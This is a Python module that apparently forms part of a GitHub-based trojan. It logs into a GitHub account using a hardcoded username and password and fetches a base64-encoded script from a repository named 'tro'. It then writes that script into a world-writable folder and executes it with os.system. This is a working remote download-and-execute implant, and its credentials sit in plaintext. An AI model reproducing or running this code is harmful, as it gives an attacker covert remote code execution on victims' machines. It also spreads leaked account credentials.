from github3 import login
import json
import base64
import os

scriptPath = "scripts/test" #"modules/dirlister.py" #
ScriptExec = "python "
encodedFiles  = False

def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_contents(filepath):
    try:
        gh,repo,branch = connect_to_github()
        tree = branch.commit.commit.tree.to_tree().recurse()
        for filename in tree.tree:
            if filepath in filename.path:
                print("[OK] Found file %s" % filepath)
                blob = repo.blob(filename._json_data['sha']) #Hashed content
                if encodedFiles:
                        return base64.b64decode(blob.content)
                return blob.content
    except:
        pass
    return None


def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
	print("[*] In RunScriptFromGit module.") #Todelete
	script	= get_file_contents(scriptPath)
	#content = None
	if script is not None:
		content	= base64.b64decode(script).decode()
		print(content)
		try:
			os.makedirs("scripts", mode=777)
		except:
			os.system("echo 'getRunScript: scripts folder exists' >> logFile.log")
		fich = open(scriptPath, "w")
		fich.write(content)
		fich.close()
		print(scriptPath)
		os.system(ScriptExec+" "+scriptPath) #os.execv("scripts/test.py") #Permission denied
		return str("getRunScript: script {} successfully started".format(scriptPath))
	else:
		print(" Unable to find file")
		#TODO: Customize log file path
		#os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
		return str("getRunScript: Unable to find script {}".format(scriptPath))

